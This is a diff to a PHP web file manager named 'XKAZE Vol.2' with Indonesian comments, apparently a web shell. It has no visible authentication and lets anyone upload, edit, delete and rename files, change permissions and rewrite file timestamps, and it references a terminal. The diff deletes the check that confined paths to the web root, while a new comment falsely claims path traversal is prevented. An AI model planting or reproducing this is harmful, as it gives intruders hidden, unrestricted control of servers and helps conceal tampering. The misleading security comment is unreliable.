@@ -1,54 +1,95 @@
 <?php
+// Path Root Direktori
 $ROOT = realpath(getcwd());
 
+// Mendapatkan path saat ini dari URL
 $path = $_GET['path'] ?? $ROOT;
 $path = realpath($path);
 
-if (!$path || strpos($path, $ROOT) !== 0) {
-    $path = $ROOT;
-}
-
+// Mengamankan input path untuk mencegah path traversal
 function safe($s) { return htmlspecialchars($s, ENT_QUOTES, 'UTF-8'); }
 
+// Memecah path menjadi bagian-bagian untuk navigasi breadcrumb
+$rel = str_replace($ROOT, "", $path); // Menyesuaikan path relatif terhadap ROOT
+$parts = array_filter(explode("/", $rel)); // Memecah path menjadi bagian-bagian
+$acc = $ROOT;
+
+
 if (isset($_POST['newfolder']) && $_POST['newfolder'] !== "") {
-    mkdir($path . "/" . basename($_POST['newfolder']));
-    header("Location: ?path=$path&create_folder_success=1");
+    $target = $path . "/" . basename($_POST['newfolder']);
+    
+    if (mkdir($target)) {
+        header("Location: ?path=$path&create_folder_success=1");
+    } else {
+        header("Location: ?path=$path&create_folder_error=1");
+    }
     exit;
 }
 
 if (isset($_POST['newfile']) && $_POST['newfile'] !== "") {
-    file_put_contents($path . "/" . basename($_POST['newfile']), "");
-    header("Location: ?path=$path&create_file_success=1");
+    $target = $path . "/" . basename($_POST['newfile']);
+    
+    if (file_put_contents($target, "") !== false) {
+        header("Location: ?path=$path&create_file_success=1");
+    } else {
+        header("Location: ?path=$path&create_file_error=1");
+    }
     exit;
 }
 
+
 if (!empty($_FILES['upfile']['name'])) {
-    move_uploaded_file($_FILES['upfile']['tmp_name'], $path . "/" . basename($_FILES['upfile']['name']));
-    header("Location: ?path=$path&upload_success=1");
+    if (move_uploaded_file($_FILES['upfile']['tmp_name'], $path . "/" . basename($_FILES['upfile']['name']))) {
+        header("Location: ?path=$path&upload_success=1");
+    } else {
+        header("Location: ?path=$path&upload_error=1");
+    }
     exit;
 }
+
 
 if (isset($_GET['delete'])) {
     $target = $_GET['delete'];
-    if (is_file($target)) unlink($target);
-    elseif (is_dir($target)) rmdir($target);
-    header("Location: ?path=" . dirname($target) . "&delete_success=1");
+    
+    if (is_file($target)) {
+        if (unlink($target)) {
+            header("Location: ?path=" . dirname($target) . "&delete_success=1");
+        } else {
+            header("Location: ?path=" . dirname($target) . "&delete_error=1");
+        }
+    } elseif (is_dir($target)) {
+        if (rmdir($target)) {
+            header("Location: ?path=" . dirname($target) . "&delete_success=1");
+        } else {
+            header("Location: ?path=" . dirname($target) . "&delete_error=1");
+        }
+    }
     exit;
 }
+
 
 if (isset($_POST['rename_from'])) {
     $old = $_POST['rename_from'];
     $new = dirname($old) . "/" . basename($_POST['rename_to']);
-    rename($old, $new);
-    header("Location: ?path=" . dirname($old) . "&rename_success=1");
+    
+    if (rename($old, $new)) {
+        header("Location: ?path=" . dirname($old) . "&rename_success=1");
+    } else {
+        header("Location: ?path=" . dirname($old) . "&rename_error=1");
+    }
     exit;
 }
 
+
 if (isset($_POST['edit_file'])) {
-    file_put_contents($_POST['edit_file'], $_POST['content']);
-    header("Location: ?path=" . dirname($_POST['edit_file']) . "&edit_file_success=1");
+    if (file_put_contents($_POST['edit_file'], $_POST['content']) !== false) {
+        header("Location: ?path=" . dirname($_POST['edit_file']) . "&edit_file_success=1");
+    } else {
+        header("Location: ?path=" . dirname($_POST['edit_file']) . "&edit_file_error=1");
+    }
     exit;
 }
+
 
 $items = scandir($path);
 $folders = [];
@@ -208,6 +249,20 @@ if (isset($_GET['update_time']) && isset($_GET['file_path']) && isset($_GET['new
     }
     exit;
 }
+
+if (isset($_GET['change_permission'])) {
+    $filePath = $_GET['file_path'];  // Path file/folder
+    $newPermission = $_GET['new_permission'];  // Permission baru (misal: 0755)
+
+    // Ubah permission menggunakan chmod()
+    if (chmod($filePath, octdec($newPermission))) {
+        header("Location: ?path=" . urlencode($path) . "&permission_success=1");
+    } else {
+        header("Location: ?path=" . urlencode($path) . "&permission_error=1");
+    }
+    exit;
+}
+
 ?>
 
 <!DOCTYPE html>
@@ -242,20 +297,13 @@ a:hover {
     color: #ff4081; /* Warna saat hover */
 }
 
-body {
-    background: url('https://twistedsifter.com/wp-content/uploads/2013/05/animated-gifs-of-fighting-game-backgrounds-25.gif') no-repeat center center fixed;
-    background-size: cover;
-    color: #eee;
-    padding: 20px;
-    font-family: "Roboto", Arial, sans-serif;
-}
 
 body {
     background: url('https://twistedsifter.com/wp-content/uploads/2013/05/animated-gifs-of-fighting-game-backgrounds-25.gif') no-repeat center center fixed;
     background-size: cover;
     color: #ddd; /* Teks lebih terang */
     padding: 20px;
-    font-family: "Roboto", Arial, sans-serif;
+    font-family: "Brush Script MT", cursive;;
 }
 
 table {
@@ -346,8 +394,10 @@ th:nth-child(4), td:nth-child(4) {
     width: 150px;
 }
 
+/* Modal Styles */
 /* Modal styles */
 .modal {
+    pointer-events: all !important;
     display: none; /* Hide modal by default */
     position: fixed;
     z-index: 1000;
@@ -362,6 +412,7 @@ th:nth-child(4), td:nth-child(4) {
 }
 
 .modal-content {
+    pointer-events: all !important;
     background: #ffffff;
     padding: 30px;
     border-radius: 10px;
@@ -371,17 +422,26 @@ th:nth-child(4), td:nth-child(4) {
     box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1); /* Soft shadow for better depth */
 }
 
-.modal-header .close-btn {
-    position: absolute;
-    top: 10px;
-    right: 10px;
-    font-size: 30px;
-    color: #aaa;
-    cursor: pointer;
+.modal-body {
+    display: flex;
+    flex-direction: column;
+    justify-content: center;  /* Memastikan konten dalam modal terpusat */
+    align-items: center;      /* Memastikan spinner terpusat */
+    text-align: center;
 }
 
-.modal-header .close-btn:hover {
-    color: #333;
+.loader {
+    border: 6px solid #f3f3f3;
+    border-top: 6px solid #4CAF50;
+    border-radius: 50%;
+    width: 45px;
+    height: 45px;
+    animation: spin 1s linear infinite;
+}
+
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
 }
 
 .checkmark {
@@ -401,32 +461,50 @@ th:nth-child(4), td:nth-child(4) {
 
 h2 {
     font-size: 24px;
-    color: #4CAF50;
+    color: #4CAF50; /* Green color for Success */
     font-weight: bold;
     margin-top: 10px;
 }
 
-p {
-    color: #666;
-    font-size: 16px;
-    margin-bottom: 20px;
-}
-
+/* OK Button Styling */
 .ok-btn {
     padding: 10px 20px;
-    background-color: #4CAF50;
+    background-color: #4CAF50; /* Green background */
     border: none;
     color: white;
     font-size: 16px;
     border-radius: 5px;
     cursor: pointer;
     transition: background-color 0.3s ease;
+    margin-top: 20px; /* Adds margin to the button to avoid overlap */
 }
 
 .ok-btn:hover {
     background-color: #45a049;
 }
 
+/* Error Modal Customization */
+#error-modal .modal-content {
+    border-top: 5px solid #e74c3c; /* Error modal border */
+}
+
+#error-loading .loader {
+    border-top: 6px solid #e74c3c;
+}
+
+#error-modal .checkmark {
+    background: #f8d7da;
+}
+
+#error-modal h2 {
+    color: #e74c3c; /* Red for error */
+}
+
+#loading-spinner {
+    display: flex;           /* Pastikan spinner tampil dengan benar */
+    justify-content: center; /* Posisikan spinner di tengah */
+    align-items: center;     /* Vertikal tengah */
+}
 
 </style>
 </head>
@@ -438,6 +516,9 @@ p {
             <span class="close-btn" onclick="closeModal()">&times;</span>
         </div>
         <div class="modal-body">
+            <div id="loading-spinner" style="display:none;">
+                <div class="loader"></div>
+            </div>
             <div class="checkmark">
                 <svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 100 100">
                     <circle cx="50" cy="50" r="45" stroke="none" stroke-width="5" fill="#d4edda"/>
@@ -451,22 +532,49 @@ p {
     </div>
 </div>
 
+<div id="error-modal" class="modal">
+    <div class="modal-content" style="border-top: 5px solid #e74c3c;">
+        <div class="modal-header">
+            <span class="close-btn" onclick="closeErrorModal()">&times;</span>
+        </div>
+        <div class="modal-body">
+            <div id="error-loading" style="display:none;">
+                <div class="loader" style="border-top:6px solid #e74c3c;"></div>
+            </div>
+            <div class="checkmark" style="background:#f8d7da;">
+                <svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 100 100">
+                    <circle cx="50" cy="50" r="45" fill="#f8d7da"/>
+                    <path fill="none" stroke="#e74c3c" stroke-width="5" d="M35 35 L65 65 M65 35 L35 65"/>
+                </svg>
+            </div>
+            <h2 style="color:#e74c3c;">Failed</h2>
+            <p id="error-message">Something went wrong!</p>
+            <button class="ok-btn" style="background:#e74c3c;" onclick="closeErrorModal()">OK</button>
+        </div>
+    </div>
+</div>
+
 
 <h2>📂 XKAZE Vol.2</h2>
 
 <div class="breadcrumb">
-<b>Path: </b>
-<?php
-$rel = str_replace($ROOT, "", $path);
-$parts = array_filter(explode("/", $rel));
-$acc = $ROOT;
+    <b>Path: </b>
+    <?php
+    // Root folder yang ingin dijadikan home path
+    $ROOT = realpath(getcwd());
+    $rel = str_replace($ROOT, "", $path); // Relatif dari path saat ini
+    $parts = array_filter(explode("/", $rel)); // Membagi path menjadi bagian-bagian
+    $acc = $ROOT; // Mulai dari folder root
 
-echo "<a href='?path=$ROOT'>www</a> / ";
-foreach ($parts as $p) {
-    $acc .= "/$p";
-    echo "<a href='?path=$acc'>$p</a> / ";
-}
-?>
+    // Menampilkan link ke root
+    echo "<a href='?path=$ROOT'>Home</a> / ";
+
+    // Untuk setiap bagian dari path, tampilkan link ke folder tersebut
+    foreach ($parts as $p) {
+        $acc .= "/$p"; // Gabungkan path
+        echo "<a href='?path=$acc'>$p</a> / "; // Tampilkan link dengan bagian path
+    }
+    ?>
 </div><br>
 <center>
 
@@ -612,30 +720,38 @@ if (!empty($_FILES['upfile']['name'])) {
     <th>Type</th>
     <th>Size</th>
     <th>Updated</th>
+    <th>Permission</th>
     <th>Aksi</th>
+</tr>
+<tr>
+    <th onclick="window.history.back()">..</th>
 </tr>
 
 <?php foreach($folders as $f): ?>
 <?php
     $full = $path . "/" . $f;
-    $lastMod = date("Y-m-d H:i:s", filemtime($full));
+    $lastMod = date("Y-m-d H:i:s", filemtime($full)); // Ambil waktu terakhir diubah
+    $permissions = substr(sprintf('%o', fileperms($full)), -4); // Mendapatkan permission dalam format oktal
 ?>
 <tr>
     <td class="folder">📁 <a href="?path=<?= safe($full) ?>"><?= safe($f) ?></a></td>
     <td>Folder</td>
     <td>-</td>
     <td>
-    <span id="time-<?= safe($full) ?>" onclick="editTime('<?= safe($full) ?>', '<?= $lastMod ?>')">
-        <?= $lastMod ?>
-    </span>
-</td>
+        <!-- Tampilkan Waktu Update dan Tombol Klik -->
+        <span id="time-<?= safe($full) ?>" onclick="editTime('<?= safe($full) ?>', '<?= $lastMod ?>')"><?= $lastMod ?></span>
+    </td>
+    <td>
+        <!-- Tampilkan Permission yang Dapat Diklik -->
+        <span id="permission-<?= safe($full) ?>" onclick="editPermission('<?= safe($full) ?>', '<?= $permissions ?>')"><?= $permissions ?></span>
+    </td>
     <td>
        <a href="?rename=<?= safe($full) ?>&path=<?= safe($path) ?>" title="Rename">
-        <i class="fas fa-pencil-alt"></i> 
-        <a href="?delete=<?= safe($full) ?>&path=<?= safe($path) ?>" onclick="return confirm('Hapus folder?')" title="Delete">
-    <i class="fas fa-trash-alt"></i> 
-</a>
-
+            <i class="fas fa-pencil-alt"></i> 
+       </a> 
+       <a href="?delete=<?= safe($full) ?>&path=<?= safe($path) ?>" onclick="return confirm('Hapus folder?')" title="Delete">
+            <i class="fas fa-trash-alt"></i> 
+       </a>
     </td>
 </tr>
 <?php endforeach; ?>
@@ -643,18 +759,22 @@ if (!empty($_FILES['upfile']['name'])) {
 <?php foreach($files as $f): ?>
 <?php
     $full = $path . "/" . $f;
-    $sizeKB = round(filesize($full) / 1024, 2);
-    $lastMod = date("Y-m-d H:i:s", filemtime($full));
+    $sizeKB = round(filesize($full) / 1024, 2); // Menampilkan ukuran dalam KB
+    $lastMod = date("Y-m-d H:i:s", filemtime($full)); // Ambil waktu terakhir diubah
+    $permissions = substr(sprintf('%o', fileperms($full)), -4); // Mendapatkan permission dalam format oktal
 ?>
 <tr>
     <td class="file">📄 <?= safe($f) ?></td>
     <td>File</td>
     <td><?= $sizeKB ?> KB</td>
     <td>
-    <span id="time-<?= safe($full) ?>" onclick="editTime('<?= safe($full) ?>', '<?= $lastMod ?>')">
-        <?= $lastMod ?>
-    </span>
-</td>
+        <!-- Tampilkan Waktu Update dan Tombol Klik -->
+        <span id="time-<?= safe($full) ?>" onclick="editTime('<?= safe($full) ?>', '<?= $lastMod ?>')"><?= $lastMod ?></span>
+    </td>
+    <td>
+        <!-- Tampilkan Permission yang Dapat Diklik -->
+        <span id="permission-<?= safe($full) ?>" onclick="editPermission('<?= safe($full) ?>', '<?= $permissions ?>')"><?= $permissions ?></span>
+    </td>
     <td>
     <a href="?view=<?= safe($full) ?>&path=<?= safe($path) ?>" title="View">
         <i class="fas fa-eye"></i> 
@@ -668,13 +788,35 @@ if (!empty($_FILES['upfile']['name'])) {
     <a href="?delete=<?= safe($full) ?>&path=<?= safe($path) ?>" onclick="return confirm('Hapus file?')" title="Delete">
         <i class="fas fa-trash-alt"></i> 
     </a>
-</td>
+    </td>
 </tr>
 <?php endforeach; ?>
+
 
 </table>
 
 <script>
+    function closeModal() {
+    const modal = document.getElementById("success-modal");
+
+    modal.style.transition = "opacity 0.3s ease";
+    modal.style.opacity = 0;
+
+    setTimeout(() => {
+        modal.style.display = "none";
+    }, 300);
+}
+
+function closeErrorModal() {
+    const modal = document.getElementById("error-modal");
+    modal.style.transition = "opacity 0.3s ease";
+    modal.style.opacity = 0;
+
+    setTimeout(() => {
+        modal.style.display = "none";
+    }, 300);
+}
+
 document.getElementById('open-terminal-btn').addEventListener('click', function() {
     document.getElementById('tbox').style.display = 'block';
     document.getElementById('tinput').style.display = 'block';
@@ -756,24 +898,6 @@ document.getElementById('upload-file').addEventListener('click', function() {
 });
 
 
-// Function to show the modal
-function showSuccessPopup(message) {
-    const modal = document.getElementById("success-modal");
-    const messageElement = document.getElementById("success-message");
-    
-    // Set the message text
-    messageElement.innerHTML = message;
-    
-    // Display the modal
-    modal.style.display = "flex";
-}
-
-// Function to close the modal
-function closeModal() {
-    const modal = document.getElementById("success-modal");
-    modal.style.display = "none";
-}
-
 window.onload = function() {
     const urlParams = new URLSearchParams(window.location.search);
 
@@ -806,24 +930,117 @@ window.onload = function() {
     if (urlParams.has('edit_file_success')) {
         showSuccessPopup("File Edited Successfully!");
     }
+
+    // Jika ada parameter error
+    if (urlParams.has('create_folder_error')) {
+        showErrorPopup("Failed to create folder!");
+    }
+
+    if (urlParams.has('create_file_error')) {
+        showErrorPopup("Failed to create file!");
+    }
+
+    if (urlParams.has('upload_error')) {
+        showErrorPopup("Failed to upload file!");
+    }
+
+    if (urlParams.has('delete_error')) {
+        showErrorPopup("Failed to delete file/folder!");
+    }
+
+    if (urlParams.has('rename_error')) {
+        showErrorPopup("Failed to rename file/folder!");
+    }
+
+    if (urlParams.has('edit_file_error')) {
+        showErrorPopup("Failed to edit file!");
+    }
 };
 
-// Fungsi untuk menampilkan pop-up sukses
+// Fungsi untuk menampilkan popup sukses
 function showSuccessPopup(message) {
     const modal = document.getElementById("success-modal");
     const messageElement = document.getElementById("success-message");
+    const check = document.querySelector(".checkmark");
+    const loader = document.getElementById("loading-spinner");
 
-    // Set message text
-    messageElement.innerHTML = message;
-
-    // Display the modal
     modal.style.display = "flex";
+    modal.style.opacity = 0;
+
+    loader.style.display = "flex";
+    check.style.display = "none";
+    messageElement.innerHTML = "";
+
+    setTimeout(() => {
+        modal.style.transition = "opacity 0.4s ease";
+        modal.style.opacity = 1;
+    }, 150);
+
+    setTimeout(() => {
+        loader.style.display = "none";
+        check.style.display = "flex"; 
+        messageElement.innerHTML = message;
+    }, 1200);
 }
 
-// Fungsi untuk menutup modal
-function closeModal() {
-    const modal = document.getElementById("success-modal");
-    modal.style.display = "none";
+// Fungsi untuk menampilkan popup error
+function showErrorPopup(message) {
+    const modal = document.getElementById("error-modal");
+    const messageElement = document.getElementById("error-message");
+    const loader = document.getElementById("error-loading");
+    const check = modal.querySelector(".checkmark");
+
+    modal.style.display = "flex";
+    modal.style.opacity = 0;
+
+    loader.style.display = "flex";
+    check.style.display = "none";
+    messageElement.innerHTML = "";
+
+    setTimeout(() => {
+        modal.style.transition = "opacity 0.4s ease";
+        modal.style.opacity = 1;
+    }, 150);
+
+    setTimeout(() => {
+        loader.style.display = "none";
+        check.style.display = "flex";
+        messageElement.innerHTML = message;
+    }, 1200);
+}
+
+function savePermission(filePath) {
+    // Ambil nilai permission baru dari input field
+    var newPermission = document.getElementById('edit-permission-' + filePath).value;
+
+    // Kirimkan data ke server untuk mengupdate permission
+    fetch(`?change_permission=1&file_path=${encodeURIComponent(filePath)}&new_permission=${encodeURIComponent(newPermission)}`)
+        .then(response => response.text())
+        .then(result => {
+            // Tampilkan hasil perubahan
+            alert("Permission updated!");
+            location.reload();  // Reload halaman untuk memperbarui data
+        })
+        .catch(error => {
+            console.error('Error:', error);
+        });
+}
+
+function editPermission(filePath, currentPermission) {
+    // Ambil elemen yang menampilkan permission
+    var permissionElement = document.getElementById('permission-' + filePath);
+    
+    // Ganti elemen span dengan input field
+    var inputHTML = `<input type="text" id="edit-permission-${filePath}" value="${currentPermission}" />`;
+    permissionElement.innerHTML = inputHTML;
+
+    // Fokuskan input field
+    document.getElementById('edit-permission-' + filePath).focus();
+
+    // Setelah input kehilangan fokus, simpan perubahan
+    document.getElementById('edit-permission-' + filePath).addEventListener('blur', function() {
+        savePermission(filePath);
+    });
 }
 
 </script>
